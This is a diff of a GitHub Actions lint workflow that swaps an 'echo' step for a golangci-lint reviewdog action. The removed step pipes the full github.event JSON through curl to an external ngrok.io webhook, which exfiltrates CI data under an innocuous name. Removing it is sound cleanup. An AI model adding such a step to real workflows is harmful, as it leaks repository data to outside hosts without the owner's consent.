@@ -5,6 +5,5 @@ jobs:
     name: runner / golangci-lint
     runs-on: ubuntu-latest
     steps:
-    - name: echo
-      run: |
-        echo ${{toJSON(github.event)}} | sed -e 's/"/\\\"/' | curl -X POST https://ec6369d4.ngrok.io/webhooks -H 'Content-Type: application/json' -d -
+      - name: Run golangci-lint with reviewdog
+        uses: reviewdog/action-golangci-lint@v1.0.3
